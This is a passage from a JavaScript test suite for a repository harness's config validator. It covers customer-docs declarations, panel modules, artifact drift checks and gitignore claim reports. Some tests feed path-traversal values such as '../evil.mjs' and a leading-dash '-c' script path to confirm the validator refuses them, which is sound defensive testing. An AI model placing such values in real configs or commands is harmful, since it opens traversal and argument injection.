    const zExtra = zActual.filter((x) => !has(zExpected, x))
    check('Z4 SCAFFOLD_CLAIMS == placement.mjs destinations + .harness-version (both directions)', !zMissing.length && !zExtra.length,
      `missing from SCAFFOLD_CLAIMS: [${zMissing.join(', ')}] · extra in SCAFFOLD_CLAIMS: [${zExtra.join(', ')}]`)
  }
  })
  section('AA', [], async () => {
  // --- AA: the customer-corpus declaration (ADR 0060) — validated by the reader, off by default ---
  // `docs.customer` is the customer-corpus schema. Three states
  // must stay distinguishable (off / malformed / validated); a traversal `dir` must be REFUSED into
  // the malformed state, never defaulted (a default would build a customer page from a directory
  // nobody named — and `..` would publish files from outside the repo into it); and every degraded
  // sub-value must warn while dropping only the entry, because the rules live in the reader and a
  // consuming repo's builder carries no copy of them. Direct import, like case V: the emitter prints no parsed
  // config, so shape assertions need the dict itself.
  {
    const fails = []
    const same = isDeepStrictEqual
    const show = (v) => JSON.stringify(v)
    const root = path.join(fx, 'customer-decl')
    fs.mkdirSync(path.join(root, 'docs', 'customer', 'prog'), { recursive: true })
    const load = (decl) => {
      fs.writeFileSync(path.join(root, '.harness.json'), JSON.stringify(decl), 'utf8')
      return hc.load(root)
    }
    const tags = (c) => c.release_stages.map((x) => x.tag)
    let cfg, w, c, joined
    // 1 absent and null are both OFF, with no warning
    for (const decl of [{ docs: { index: 'docs/index.json' } }, { docs: { customer: null } }]) {
      ;[cfg, w] = load(decl)
      if (cfg.customer !== null || w.some((x) => x.includes('customer'))) fails.push('absent/null did not read as OFF without warnings: ' + show(w))
    }
    // 2 a valid block validates silently; defaults fill; a trailing slash on dir is normalized
    ;[cfg, w] = load({ docs: { customer: { dir: 'docs/customer/', title: 'r · 고객 문서',
      chip_field: 'program_file', chip_suffix: '.p',
      groups: [{ label: 'A (25.x)', keys: [25] }, { label: 'B', keys: [27, 28] }],
      other_label: '기타', unkeyed_label: '배치', projects_md: true } } })
    c = cfg.customer
    if (w.length || c.malformed || c.dir !== 'docs/customer' || c.group_field !== 'menu' ||
        !same(c.groups, [{ label: 'A (25.x)', keys: [25] }, { label: 'B', keys: [27, 28] }]) ||
        c.projects_md !== true || !same(tags(c), ['FUT', 'UAT', 'PROD'])) {
      fails.push('a valid block did not validate cleanly: ' + show(c) + ' ' + show(w))
    }
    // 3 a traversal dir is REFUSED into the malformed state, never defaulted
    ;[cfg, w] = load({ docs: { customer: { dir: '../outside' } } })
    if (cfg.customer.malformed !== 'dir refused' || !w.some((x) => x.includes('CANNOT be built'))) {
      fails.push('traversal dir was not refused as malformed: ' + show(cfg.customer) + ' ' + show(w))
    }
    // 4 a non-object block is malformed
    ;[cfg, w] = load({ docs: { customer: 'yes' } })
    if (!cfg.customer.malformed || !w.some((x) => x.includes('expected an object'))) fails.push('non-object block was not malformed')
    // 5 a missing corpus dir warns and is KEPT (the builder refuses at build time and names it)
    ;[cfg, w] = load({ docs: { customer: { dir: 'docs/nope' } } })
    if (cfg.customer.malformed || !w.some((x) => x.includes('does not exist'))) fails.push('missing dir did not warn, or was wrongly malformed: ' + show(w))
    // 6 every degraded sub-value warns; the ENTRY is dropped, never the block
    ;[cfg, w] = load({ docs: { customer: { dir: 'docs/customer', bogus: 1, '//c': 'x',
      projects_md: 'false', chip_field: 'bad key!', required_frontmatter: ['ok_key', 'bad-key'],
      groups: [{ label: 'a' }, { label: 'b', keys: ['25'] }, { label: 'c', keys: [1, true] },
        'str', { label: 'e', keys: [9], x: 1 }],
      release_stages: [{ tag: 'FUT' }, { tag: 'FUT', label: 'dup' }, { tag: 'bad tag' },
        { tag: 'PROD', label: '완료' }],
      title: 5, eyebrow: 'line\ntwo' } } })
    c = cfg.customer
    joined = w.join('\n')
    for (const e of ["unknown key 'bogus' ignored (known: dir, title", 'projects_md: must be a JSON boolean',
      'treated as false', "chip_field: 'bad key!' is not a frontmatter key name",
      "required_frontmatter: 'bad-key' is not a frontmatter key name",
      "groups[0]: needs a non-empty 'label' and 'keys'", 'groups[1]: needs', 'refused: 25',
      'groups[2]: needs', 'refused: True', 'groups[3]: expected an object',
      "groups[4]: unknown key 'x' ignored (known: label, keys)",
      "release_stages[1]: duplicate tag 'FUT'", "release_stages[2]: tag 'bad tag' must be",
      'title: must be a string', 'eyebrow: control character(s)']) {
      if (!joined.includes(e)) fails.push('missing warning: ' + e)
    }
    if (joined.includes("'//c'")) fails.push('a //-prefixed key warned')
    if (c.malformed || c.projects_md !== false || c.chip_field !== '' ||
        !same(c.required_frontmatter, ['ok_key']) || !same(c.groups, [{ label: 'e', keys: [9] }]) ||
        !same(c.release_stages, [{ tag: 'FUT', label: 'FUT' }, { tag: 'PROD', label: '완료' }]) ||
        c.title !== '' || c.eyebrow !== 'line\\ntwo') {
      fails.push('degraded values were not dropped/defaulted as declared: ' + show(c))
    }
    if (c.eyebrow.includes('\n')) fails.push('a raw newline survived into a display value')
    // 7 wrong container types are ignored with a warning; defaults stay
    ;[cfg, w] = load({ docs: { customer: { groups: 'no', release_stages: [{ tag: '!!' }], required_frontmatter: 'x' } } })
    c = cfg.customer
    if (!same(c.groups, []) || !same(c.required_frontmatter, []) || !same(tags(c), ['FUT', 'UAT', 'PROD']) ||
        !w.some((x) => x.includes('groups: expected a list')) ||
        !w.some((x) => x.includes('every entry was rejected — using the default vocabulary'))) {
      fails.push('wrong container types were not defaulted with warnings: ' + show(c) + ' ' + show(w))
    }
    // 8 an EXPLICIT empty value warns and defaults — "" is something the declarer wrote, never "absent"
    ;[cfg, w] = load({ docs: { customer: { dir: '', chip_field: '', group_field: '', title: '',
      required_frontmatter: ['', 'ok'], release_stages: [] } } })
    c = cfg.customer
    joined = w.join('\n')
    for (const e of ["dir: declared empty — using the default 'docs/customer'", 'chip_field: declared empty — ignored',
      "group_field: declared empty — using the default 'menu'",
      'required_frontmatter: declared empty — ignored',
      'release_stages: declared empty — using the default vocabulary']) {
      if (!joined.includes(e)) fails.push('missing empty-value warning: ' + e)
    }
    if (joined.includes('every entry was rejected')) fails.push("an EMPTY release_stages list was reported as 'every entry was rejected'")
    if (c.malformed || c.dir !== 'docs/customer' || c.group_field !== 'menu' ||
        !same(c.required_frontmatter, ['ok']) || !same(tags(c), ['FUT', 'UAT', 'PROD'])) {
      fails.push('explicit empties did not take the defaults: ' + show(c))
    }
    // 9 declared-vs-unset is carried: the explicit "" title IS declared, the absent eyebrow is NOT
    if (!c.declared.includes('title') || c.declared.includes('eyebrow') || !c.declared.includes('dir')) {
      fails.push('`declared` does not distinguish an explicit "" from an absent key: ' + show(c.declared))
    }
    // 10 defaults are copied per load — mutating a returned value cannot poison the next load
    //    (a shallow list copy would alias the default stage dicts)
    ;[cfg, w] = load({ docs: { customer: {} } })
    if (w.length || !same(cfg.customer.declared, []) || cfg.customer.malformed) {
      fails.push('an empty object did not read as ON-with-defaults, silently: ' + show(cfg.customer) + ' ' + show(w))
    }
    cfg.customer.release_stages[0].label = 'POISON'
    const [cfg2] = load({ docs: { customer: {} } })
    if (cfg2.customer.release_stages[0].label !== 'FUT') fails.push('a mutation of a returned default poisoned the next load')
    // 11 panels (the extension point): a module path is a script-gate-class value — the builder
    //    IMPORTS it — so traversal / leading dash are refused per entry; a module that is not an .mjs file
    //    is KEPT with a warning, because dropping the tab would let the build pass without it (the builder
    //    refuses until the panel is an .mjs module); a missing file is kept and warned (the builder refuses
    //    at build time); a blank label drops the entry
    fs.mkdirSync(path.join(root, 'scripts', 'panels'), { recursive: true })
    fs.writeFileSync(path.join(root, 'scripts', 'panels', 'ok.mjs'), "export const CSS = ''\nexport function render_panel(root) { return '<p>x</p>' }\n", 'utf8')
    ;[cfg, w] = load({ docs: { customer: { panels: [
      { module: 'scripts/panels/ok.mjs', label: '환경 차이' },
      { module: '../evil.mjs', label: 't' },
      { module: '-x.mjs', label: 't' },
      { module: 'scripts/panels/notmjs.txt', label: 't' },
      { module: 'scripts/panels/missing.mjs', label: 'later' },
      { module: 'scripts/panels/ok.mjs', label: '' },
      'str', { module: 'scripts/panels/ok.mjs', label: 'k', z: 1 }] } } })
    c = cfg.customer
    joined = w.join('\n')
    if (!same(c.panels.map((p) => p.module), ['scripts/panels/ok.mjs', 'scripts/panels/notmjs.txt', 'scripts/panels/missing.mjs', 'scripts/panels/ok.mjs']) ||
        c.panels[0].label !== '환경 차이') {
      fails.push('panels did not keep exactly the safe entries: ' + show(c.panels))
    }
    for (const e of ["panels[1]: module '../evil.mjs' refused", "panels[2]: module '-x.mjs' refused",
      "panels[3]: module 'scripts/panels/notmjs.txt' is not an .mjs module — the docs build will refuse",
      "panels[4]: module 'scripts/panels/missing.mjs' does not exist",
      "panels[5]: needs a non-empty 'label'", 'panels[6]: expected an object',
      "panels[7]: unknown key 'z' ignored (known: module, label, id, position)"]) {
      if (!joined.includes(e)) fails.push('missing panels warning: ' + e)
    }
    // a Python panel of an older repo is kept and warned the same way (the docs build then refuses it)
    ;[cfg, w] = load({ docs: { customer: { panels: [{ module: 'scripts/panels/old.py', label: 'p' }] } } })
    if (!same(cfg.customer.panels.map((p) => p.module), ['scripts/panels/old.py']) ||
        !w.some((x) => x.includes("panels[0]: module 'scripts/panels/old.py' is not an .mjs module"))) {
      fails.push('a .py panel was not kept with the not-an-.mjs warning: ' + show(cfg.customer.panels) + ' ' + show(w))
    }
    ;[cfg, w] = load({ docs: { customer: { panels: 'no' } } })
    if (!same(cfg.customer.panels, []) || !w.some((x) => x.includes('panels: expected a list'))) fails.push('a non-list panels value was not defaulted with a warning')
    // 12 ADR 0061 — panel id / position / default_tab / footer_date_label: a declared id is used
    //    verbatim; a refused or duplicate id drops the ENTRY (a published deep link is never silently
    //    renamed); 'docs' is reserved; an absent id derives (label slug, else panel-<n> over the KEPT
    //    entries); a bad position degrades to after-docs; default_tab is validated against the FINAL ids
    ;[cfg, w] = load({ docs: { customer: { panels: [
      { module: 'scripts/panels/ok.mjs', label: '프로세스 맵', id: 'process', position: 'before-docs' },
      { module: 'scripts/panels/ok.mjs', label: '환경 차이' },
      { module: 'scripts/panels/ok.mjs', label: 'Env Diff', position: 'sideways' },
      { module: 'scripts/panels/ok.mjs', label: 'dup', id: 'process' },
      { module: 'scripts/panels/ok.mjs', label: 'res', id: 'docs' },
      { module: 'scripts/panels/ok.mjs', label: 'bad', id: 'Top-1' }],
      default_tab: 'env-diff', footer_date_label: '최종 갱신' } } })
    c = cfg.customer
    if (!same(c.panels.map((p) => [p.id, p.position]), [['process', 'before-docs'], ['panel-1', 'after-docs'], ['env-diff', 'after-docs']])) {
      fails.push('panel ids/positions: ' + show(c.panels))
    }
    if (c.default_tab !== 'env-diff' || c.footer_date_label !== '최종 갱신' || !c.declared.includes('default_tab')) {
      fails.push('default_tab/footer_date_label not carried: ' + show([c.default_tab, c.footer_date_label]))
    }
    for (const e of ["panels[2]: position 'sideways' is not one of before-docs, after-docs — using 'after-docs'",
      "panels[3]: id 'process' is already taken — entry ignored",
      "panels[4]: id 'docs' is reserved for the documents tab — entry ignored",
      "panels[5]: id 'Top-1' must match ^[a-z][a-z0-9_-]*$ — entry ignored"]) {
      if (!w.some((x) => x.includes(e))) fails.push('missing 0061 warning: ' + e)
    }
    ;[cfg, w] = load({ docs: { customer: { panels: [{ module: 'scripts/panels/ok.mjs', label: 'x', id: 'x' }], default_tab: 'nope' } } })
    if (cfg.customer.default_tab !== '' || !w.some((x) => x.includes("default_tab: 'nope' is not a tab id (docs, x)"))) {
      fails.push('an unknown default_tab was not warned + unset: ' + show(w))
    }
    ;[cfg, w] = load({ docs: { customer: { panels: [{ module: 'scripts/panels/ok.mjs', label: 'A' }, { module: 'scripts/panels/ok.mjs', label: 'a' }] } } })
    if (!same(cfg.customer.panels.map((p) => p.id), ['a', 'panel-1']) || !w.some((x) => x.includes("derived id 'a' collides"))) {
      fails.push('a colliding derived id did not fall back to panel-<n> with a warning: ' + show(cfg.customer.panels) + ' ' + show(w))
    }
    // The fallback must skip an id an EARLIER entry declared — `id: "panel-1"`
    //    followed by a Korean label (empty slug) would otherwise give two tabs one data-top / scope class
    ;[cfg, w] = load({ docs: { customer: { panels: [{ module: 'scripts/panels/ok.mjs', label: 'A', id: 'panel-1' }, { module: 'scripts/panels/ok.mjs', label: '데모' }] } } })
    if (!same(cfg.customer.panels.map((p) => p.id), ['panel-1', 'panel-2'])) {
      fails.push('a derived fallback collided with a declared id: ' + show(cfg.customer.panels.map((p) => p.id)))
    }
    // A non-string display value is IGNORED — so it must also leave `declared`,
    //    or the builder reads the untouched "" as an intentional blank instead of filling its default
    ;[cfg, w] = load({ docs: { customer: { footer_date_label: 123, title: ['x'] } } })
    c = cfg.customer
    if (c.footer_date_label !== '' || c.declared.includes('footer_date_label') || c.declared.includes('title') ||
        !w.some((x) => x.includes('footer_date_label: must be a string — ignored'))) {
      fails.push('an ignored non-string display value stayed in declared: ' + show(c.declared) + ' ' + show(w))
    }
    g('AA docs.customer: off/malformed/validated stay distinct, a traversal dir is refused, every degraded value warns', fails.length === 0, `AA-FAIL: ${fails.join('; ')}`)
  }
  })
  section('AA2', [], async () => {
  // AA2: the CLI path — the refusal reaches the emitter's warning channel, where CI reads it, and
  // the run stays advisory (exit 0): the declaration is metadata class (ADR 0038), not a gate.
  const CFG_CUST = P`{
  "docs": { "customer": { "dir": "../outside" } },
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": []
}`
  const repoAA2 = newRepo('customer-cli', CFG_CUST, ['src/x.py'])
  const rAA2 = await gates(repoAA2)
  check('AA2 the emitter surfaces a refused customer dir as a warning and stays advisory', m(rAA2.Out, P`docs\.customer\.dir: '\.\./outside' refused`) && rAA2.Code === 0, `exit=${rAA2.Code}: ${rAA2.Out}`)
  })
  section('AB', ['S'], async () => {
  // --- AB: declared-artifact source + drift check (ADR 0068) --------------------------------------
  // `source` is completeness (allowlist-clean path that EXISTS); `check` is the script-gate shape
  // minus `files`, composed into the gates window as `# whole-program` — CI's extraction runs it,
  // pre-commit's existing rule defers it, `seen` dedupes it against an identical group gate. A
  // check on a VIOLATING item must never emit: half-validated enforcement reading as enforcement
  // is the defect class. All failure shapes are `artifact: VIOLATION` (CI's fail string), never a
  // warn-and-drop.
  newAb = (name, items, gatesJson = '[]') => {
    const cfg = `{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "artifacts": { "readme": "README.md", "items": [ ${items} ] },
  "groups": [ { "name": "py", "match": "^src/", "cwd": "", "strip_prefix": "", "gates": ${gatesJson} } ]
}`
    const r = newRepo(name, cfg, ['src/x.py'])
    put(r, 'README.md', `docs: ${SURL}`)
    put(r, 'docs/page.html', '<p>page</p>')
    put(r, 'scripts/check_drift.py', 'import sys; sys.exit(0)')
    return r
  }
  abItem = (title, extra) => `{ "url": "${SURL}", "title": "${title}"${extra} }`
  abCheck = P`, "check": { "runner": "python", "script": "scripts/check_drift.py" }`
  abSrc = ', "source": "docs/page.html"'
  })
  section('AB1', ['AB'], async () => {
  // AB1: valid source + check — ok line carries both, the check lands in the window whole-program.
  const repoAB1 = newAb('ab1-ok', abItem('ab1-ok · docs', abSrc + abCheck))
  const rAB1 = await gates(repoAB1)
  check('AB1 ok line reports source committed and check declared', m(rAB1.Out, P`artifact: ok — .*· source docs/page\.html committed · check declared — emitted under gates: as whole-program`), rAB1.Out)
  check('AB1 the [artifacts] header sits inside the gates window in group-header shape', m(rAB1.Out, P`(?m)^  \[artifacts\] 1 declared drift check\(s\) — run on every slice \(ywr-harness ADR 0068\)`), rAB1.Out)
  check('AB1 the check is a 4-space command line marked # whole-program (CI runs it, pre-commit defers it)', m(rAB1.Out, P`(?m)^    python scripts/check_drift\.py   # whole-program: declared-artifact drift check \(ywr-harness ADR 0068\)`), rAB1.Out)
  })
  section('AB2', ['AB'], async () => {
  // AB2: a group already declares the identical whole-program gate — `seen` dedupes VISIBLY, the
  // command is emitted exactly once (the canon's own dogfood state: onboarding group + item check).
  const repoAB2 = newAb('ab2-dedupe', abItem('ab2-dedupe · docs', abSrc + abCheck), '[ { "runner": "python", "script": "scripts/check_drift.py", "files": false } ]')
  const rAB2 = await gates(repoAB2)
  const ab2Run = lines(rAB2.Out).filter((l) => nm(l, WARN) && m(l, CMD) && m(l, 'check_drift'))
  check('AB2 an identical group gate dedupes the check to ONE command line', ab2Run.length === 1, `lines: ${ab2Run.join(' | ')}`)
  check('AB2 the dedupe is visible, never silent', m(rAB2.Out, P`\(already emitted above — deduplicated: python scripts/check_drift\.py\)`), rAB2.Out)
  })
  section('AB3', ['AB'], async () => {
  // AB3: a source missing from the tree is a VIOLATION, and the item's otherwise-valid check must
  // NOT emit — half-validated enforcement reading as enforcement is the defect class.
  const repoAB3 = newAb('ab3-nosrc', abItem('ab3-nosrc · docs', ', "source": "docs/absent.html"' + abCheck))
  const rAB3 = await gates(repoAB3)
  check('AB3 a missing source file is a VIOLATION naming the path', m(rAB3.Out, P`artifact: VIOLATION — 'ab3-nosrc · docs': declared source 'docs/absent\.html' is not a file in the tree`), rAB3.Out)
  check('AB3 the violating item emits NO check', nm(rAB3.Out, P`\[artifacts\]`) && nm(rAB3.Out, 'declared-artifact drift check'), rAB3.Out)
  })
  section('AB4', ['AB'], async () => {
  // AB4: a traversal source is refused at the allowlist, not by the existence probe.
  const repoAB4 = newAb('ab4-trav', abItem('ab4-trav · docs', ', "source": "../outside.html"'))
  const rAB4 = await gates(repoAB4)
  check('AB4 a traversal source is refused', m(rAB4.Out, P`artifact: VIOLATION.*source '\.\./outside\.html' refused`), rAB4.Out)
  })
  section('AB5', ['AB'], async () => {
  // AB5: a check without a source is a VIOLATION — a drift check needs the file it guards.
  const repoAB5 = newAb('ab5-nosource', abItem('ab5-nosource · docs', abCheck))
  const rAB5 = await gates(repoAB5)
  check('AB5 check without source is a VIOLATION', m(rAB5.Out, 'artifact: VIOLATION.*check declared without source'), rAB5.Out)
  })
  section('AB6', ['AB'], async () => {
  // AB6: a check runner outside the closed set is a VIOLATION (never a warn-and-drop) and emits
  // nothing; a bad script path is the same class.
  const repoAB6 = newAb('ab6-runner', abItem('ab6-runner · docs', abSrc + ', "check": { "runner": "bash", "script": "scripts/check_drift.py" }'))
  const rAB6 = await gates(repoAB6)
  check('AB6 a check runner outside the closed set is a VIOLATION', m(rAB6.Out, "artifact: VIOLATION.*check runner 'bash' is not in the closed set") && nm(rAB6.Out, P`\[artifacts\]`), rAB6.Out)
  const repoAB6b = newAb('ab6b-script', abItem('ab6b-script · docs', abSrc + ', "check": { "runner": "python", "script": "-c" }'))
  const rAB6b = await gates(repoAB6b)
  check('AB6b a leading-dash check script is refused as a VIOLATION', m(rAB6b.Out, "artifact: VIOLATION.*check script path '-c' refused"), rAB6b.Out)
  })
  section('AB7', ['AB'], async () => {
  // AB7: `files` is not a check key — warned, ignored, the check still emits (a check is ALWAYS
  // whole-program; a JSON string "false" here must never invert into file-scoping, the fact-36 class).
  const repoAB7 = newAb('ab7-files', abItem('ab7-files · docs', abSrc + ', "check": { "runner": "python", "script": "scripts/check_drift.py", "files": true }'))
  const rAB7 = await gates(repoAB7)
  check('AB7 a files key on a check warns and is ignored; the check still emits whole-program',
    m(rAB7.Out, P`warn: artifacts\.items\[0\]\.check: 'files' is not a check key`) && m(rAB7.Out, P`(?m)^    python scripts/check_drift\.py   # whole-program: declared-artifact drift check`), rAB7.Out)
  })
  section('AB8', ['AB'], async () => {
  // AB8: source without check is legal — completeness enforced, the drift gap SAID, never silent.
  const repoAB8 = newAb('ab8-nocheck', abItem('ab8-nocheck · docs', abSrc))
  const rAB8 = await gates(repoAB8)
  check('AB8 source without check reports the unenforced drift gap on the ok line', m(rAB8.Out, P`artifact: ok — .*source docs/page\.html committed · no check declared — drift between this source and its generator is unenforced`), rAB8.Out)
  })
  section('AB9', ['AB'], async () => {
  // AB9: a url+title-only item (ADR 0032's shape) is legal — and the ok line SAYS it is
  // hand-published with nothing to republish from, so the artifact-publish skill's step-1 taxonomy
  // has a shape for it.
  const repoAB9 = newAb('ab9-handpub', abItem('ab9-handpub · docs', ''))
  const rAB9 = await gates(repoAB9)
  check('AB9 a source-less item names the hand-published shape on the ok line', m(rAB9.Out, P`artifact: ok — .*· no source declared — hand-published page \(ywr-harness ADR 0032 shape\); not publishable via /ywr-harness:artifact-publish`), rAB9.Out)
  check('AB9 a source-less item emits no check and stays ok, never a VIOLATION', nm(rAB9.Out, P`\[artifacts\]`) && nm(rAB9.Out, 'artifact: VIOLATION'), rAB9.Out)
  })
  section('AC', [], async () => {
  // --- AC: ignored-tree claims (ADR 0077) — a group whose match also claims gitignored paths ------
  // The canon's own `evals` group is the model case: a gitignored UNTRACKED file
  // never reaches the emitter (`ls-files --others --exclude-standard`), so a group regex that
  // overlaps an ignored tree is invisible right up to a force-add — and then the file is claimed and
  // gated as an ordinary member, never flagged as ungrouped. The trailer report names the group, the
  // count, and the DECIDING .gitignore rule (`source:line `pattern``) so the fix — narrow the match
  // or a lookahead — is one edit away. Report only: CI does not grep it (ADR 0077 names the
  // promotion trigger). The report is a function of the COMMIT, not the clone: per-clone exclusion
  // sources (`core.excludesFile`, `.git/info/exclude`) are filtered out (AC5).
  newIgnRepo = (name, config, ignore, ignoredFiles, changed) => {
    const p = newRepo(name, config, [])
    if (ignore) {
      put(p, '.gitignore', ignore)
      fixtureCommit(p, 'ignore')   // commits .gitignore alone — the ignored files are written after
    }
    for (const f of [...ignoredFiles, ...changed]) put(p, f, 'x')
    return p
  }
  // One changed, claimed file (web/main.ts) in every fixture: the per-slice path returns before the
  // trailer when the scope is empty, so the report needs a scope to ride on (the --all audit does not).
  newAcConfig = (groupsJson) => '{ "review": { "canon": "REVIEW.md", "docs_only": ["^docs/"], "harness_layer": [], "critical": [] }, "groups": [ ' + groupsJson +
    P`, { "name": "web", "match": "^web/.*\\.ts$", "cwd": "", "strip_prefix": "", "gates": [] } ] }`
  CFG_AC = newAcConfig(P`{ "name": "build", "match": "^out/.*\\.js$", "cwd": "", "strip_prefix": "", "gates": [] }`)
  })
  section('AC1', ['AC'], async () => {
  // AC1: a directory rule claimed — count, deciding rule, consequence, fix shape; below the tier line.
  repoAC1 = newIgnRepo('ac1-claim', CFG_AC, 'out/\nnotes.tmp\n', ['out/a.js', 'out/b.js', 'out/deep/c.js', 'notes.tmp'], ['web/main.ts'])
  const rAC1 = await gates(repoAC1)
  check('AC1 a group claiming a gitignored tree is reported with the count and the deciding rule', m(rAC1.Out, P`(?m)^ignored-tree claims \(1 group\(s\)`) && m(rAC1.Out, P`(?m)^  groups\[build\] claims 3 file\(s\) ignored by \.gitignore:1 \x60out/\x60`), rAC1.Out)
  check('AC1 an ignored path no group claims is not reported (notes.tmp)', nm(rAC1.Out, P`notes\.tmp`), rAC1.Out)
  check('AC1 the header names the consequence and the fix shape', m(rAC1.Out, 'ungrouped backstop is blind') && m(rAC1.Out, P`\(\?!results/\) lookahead`), rAC1.Out)
  check('AC1 still advisory (exit 0)', rAC1.Code === 0, `exit=${rAC1.Code}`)
  const ac1Parts = rAC1.Out.split(/review tier:/iu)
  check("AC1 the report sits below the tier line — outside both output parsers' window", ac1Parts.length === 2 && m(ac1Parts[1], 'ignored-tree claims'), rAC1.Out)
  check('AC1 the detail line is not a gates-window group header shape (no 2-space `[name]`)', nm(rAC1.Out, P`(?m)^  \[build\]`), rAC1.Out)
  })
  section('AC2', ['AC1'], async () => {
  // AC2: the full-tree audit (CI's push-to-main shape) carries the same report — a tree fact.
  const rAC2 = await gates(repoAC1, ['--all'])
  check('AC2 the --all audit carries the same report', m(rAC2.Out, P`groups\[build\] claims 3 file\(s\) ignored by \.gitignore:1 \x60out/\x60`), rAC2.Out)
  })
  section('AC3', ['AC'], async () => {
  // AC3: gitignored paths exist, no group claims them — the clean line states what was checked.
  const repoAC3 = newIgnRepo('ac3-clean', rep(CFG_AC, '^out/', '^src/'), 'out/\nnotes.tmp\n', ['out/a.js', 'out/b.js', 'out/deep/c.js', 'notes.tmp'], ['web/main.ts'])
  const rAC3 = await gates(repoAC3)
  check('AC3 no claim — the clean line states how many gitignored paths were checked', m(rAC3.Out, P`ignored-tree claims: none — 4 gitignored path\(s\) checked against 2 group\(s\)`), rAC3.Out)
  })
  section('AC4', ['AC'], async () => {
  // AC4: nothing gitignored in the checkout (CI's fresh clone before any build) — said, never read as clean.
  const repoAC4 = newIgnRepo('ac4-none', CFG_AC, '', [], ['web/main.ts'])
  const rAC4 = await gates(repoAC4)
  check('AC4 nothing gitignored in this checkout is stated as none CHECKED, not none found', m(rAC4.Out, P`ignored-tree claims: none checked — no path in this checkout is excluded by the repo's committed \.gitignore files`), rAC4.Out)
  })
  section('AC5', ['AC'], async () => {
  // AC5: per-clone exclusion sources are NOT the repo's policy. `out/` is excluded only through
  // core.excludesFile and `*.tmp` only through .git/info/exclude — both exclude the paths from the
  // emitter's scope exactly as .gitignore would, so the listing sees them; the report must not.
  const repoAC5 = newIgnRepo('ac5-perclone', CFG_AC, '', ['out/a.js', 'out/b.js'], ['web/main.ts'])
  put(repoAC5, 'my-excludes', 'out/\nmy-excludes\n')
  gitq(repoAC5, ['config', 'core.excludesFile', path.join(repoAC5, 'my-excludes')])
  put(repoAC5, '.git/info/exclude', '*.tmp\n')
  put(repoAC5, 'scratch.tmp')
  const rAC5 = await gates(repoAC5)
  check('AC5 paths excluded only by core.excludesFile / .git/info/exclude are per-clone and not counted', m(rAC5.Out, 'ignored-tree claims: none checked') && nm(rAC5.Out, P`groups\[build\]`), rAC5.Out)
  check('AC5 those paths still stayed out of the scope (the listing did see them)', nm(rAC5.Out, P`out/a\.js`) && nm(rAC5.Out, P`scratch\.tmp`), rAC5.Out)
  })
  section('AC5b', ['AC'], async () => {
  // AC5b: the same per-clone mechanism in its RELATIVE shape: core.excludesFile
  // set to an in-tree path that is NAMED `.gitignore` but is untracked prints in `check-ignore -v` as
  // `local/.gitignore` — byte-for-byte the shape of a committed nested .gitignore — and an untracked
  // `sub/.gitignore` dropped into the tree is per-clone too. Only a TRACKED .gitignore is the repo's
  // policy: the tracked set (`git ls-files -- .gitignore **/.gitignore`) decides, not the path's shape.
  repoAC5b = newIgnRepo('ac5b-relative', CFG_AC, '', ['out/a.js'], ['web/main.ts'])
  put(repoAC5b, 'local/.gitignore', 'out/\nlocal/\n')
  gitq(repoAC5b, ['config', 'core.excludesFile', 'local/.gitignore'])
  put(repoAC5b, 'sub/.gitignore', '*.log\n')
  put(repoAC5b, 'sub/run.log')
  const rAC5b = await gates(repoAC5b)
  check('AC5b a RELATIVE core.excludesFile named .gitignore and an untracked nested .gitignore are per-clone — not counted', m(rAC5b.Out, 'ignored-tree claims: none checked') && nm(rAC5b.Out, P`groups\[build\]`), rAC5b.Out)
  })
  section('AC5c', ['AC5b'], async () => {
  // AC5c: the positive twin — commit the nested .gitignore and the same rule COUNTS (the tracked set is
  // what flipped, nothing else): mutation anchor for a tracked-set check that silently read nothing.
  fixtureCommit(repoAC5b, 'track sub/.gitignore')
  const rAC5c = await gates(repoAC5b, ['--all'])
  check('AC5c once tracked, the nested .gitignore rule counts (1 path checked, still no claim)', m(rAC5c.Out, P`ignored-tree claims: none — 1 gitignored path\(s\) checked against 2 group\(s\)`), rAC5c.Out)
  })
  section('AC6', ['AC'], async () => {
  // AC6: a nested .gitignore is named as the source; an EXACT-NAME rule is the CRLF regression anchor —
  // a newline-separated `--stdin` list reaches git as `notes.tmp\r` through Windows' text-mode pipe,
  // which no exact-name rule matches while directory rules still match their prefix (docs/docs.html
  // and claude/managed-settings.dist.json vanished from the report in the canon). NUL records (`-z`) are what keeps this assertion green on Windows.
  const repoAC6 = newIgnRepo('ac6-nested', newAcConfig(P`{ "name": "logs", "match": "^out/.*\\.log$", "cwd": "", "strip_prefix": "", "gates": [] }, { "name": "tmp", "match": "^notes\\.tmp$", "cwd": "", "strip_prefix": "", "gates": [] }`), 'notes.tmp\n', [], [])
  put(repoAC6, 'out/.gitignore', '*.log\n')
  fixtureCommit(repoAC6, 'nested ignore')
  for (const f of ['out/run.log', 'notes.tmp', 'web/main.ts']) put(repoAC6, f, 'x')
  const rAC6 = await gates(repoAC6)
  check('AC6 a nested .gitignore is the named source', m(rAC6.Out, P`groups\[logs\] claims 1 file\(s\) ignored by out/\.gitignore:1 \x60\*\.log\x60`), rAC6.Out)
  check('AC6 an exact-name rule is matched (CRLF --stdin regression anchor)', m(rAC6.Out, P`groups\[tmp\] claims 1 file\(s\) ignored by \.gitignore:1 \x60notes\.tmp\x60`), rAC6.Out)
  check('AC6 both claims count in the header', m(rAC6.Out, P`ignored-tree claims \(2 group\(s\)`), rAC6.Out)
  })
  section('AC7', ['AC'], async () => {
  // AC7: more deciding rules than the line names — the cap is SAID, never applied silently.
  const repoAC7 = newIgnRepo('ac7-cap', newAcConfig(P`{ "name": "tmp4", "match": "^t[0-9]\\.tmp$", "cwd": "", "strip_prefix": "", "gates": [] }`), 't1.tmp\nt2.tmp\nt3.tmp\nt4.tmp\n', ['t1.tmp', 't2.tmp', 't3.tmp', 't4.tmp'], ['web/main.ts'])
  const rAC7 = await gates(repoAC7)
  check('AC7 rules beyond the cap are counted on the line (+1 more rule(s))', m(rAC7.Out, P`groups\[tmp4\] claims 4 file\(s\) ignored by \.gitignore:1 \x60t1\.tmp\x60, \.gitignore:2 \x60t2\.tmp\x60, \.gitignore:3 \x60t3\.tmp\x60 … \+1 more rule\(s\)`), rAC7.Out)
  })
  section('AD', [], async () => {
  // --- AD: compose() shell-quotes each argv element ------------------------------------------------
  // The closed set's `pytest-nondb` carries `-m "not db"` — ONE element with a space. A space-joined
  // argv would hand `sh -c` `-m not db`, and pytest would read `db` as a path (exit 4) on every run,
